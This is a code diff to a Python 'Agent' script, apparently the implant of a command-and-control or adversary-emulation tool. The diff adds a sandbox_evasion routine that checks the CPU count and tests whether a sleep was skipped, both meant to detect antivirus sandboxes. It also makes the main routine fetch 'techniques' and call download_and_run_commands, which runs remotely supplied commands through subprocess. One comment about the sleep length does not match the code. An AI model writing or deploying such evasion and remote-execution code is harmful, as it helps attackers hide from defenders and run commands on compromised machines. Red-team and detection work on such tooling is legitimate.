@@ -1,3 +1,5 @@
+import datetime
+import os
 import platform
 import subprocess
 import time
@@ -17,9 +19,11 @@ def execute_command(command_issued):
     error = cmd.stderr.read().decode("utf-8")
 
     if error is not '':
-        return error
+        return 'Error: ' + error
 
-    return success
+    if success == '':
+        success = 'This command ran successfully but produced no console output'
+    return 'Success: ' + success
 
 
 def get_platform():
@@ -127,9 +131,36 @@ def send_output():
 #     print('Response code: ' + str(req.status))
 #     print('Response: ' + response)
 
+def sandbox_evasion():
+    # SANDBOX 1 :Check number of CPU core
+    if os.cpu_count() >= 2:
+
+        # Get the current time
+        now = datetime.datetime.now()
+
+        # Stop code execution for 1 seconds
+        time.sleep(1)
+
+        # Get the time after 2 seconds
+        now2 = datetime.datetime.now()
+
+        # SANDBOX 2 :Check if AV skipped sleep function
+        if (now2 - now) > datetime.timedelta(seconds=1):
+            print('Run')
+        else:
+            print('Sandbox')
+
 
 if __name__ == '__main__':
     print('Agent running')
-    send_output()
+    sandbox_evasion()
+    # send_output()
+    print(datetime.datetime.now())
+    techs = get_techniques()
+    print(techs)
+    print(datetime.datetime.now())
+    results = download_and_run_commands()
+    print(results)
+    print(datetime.datetime.now())
 
 
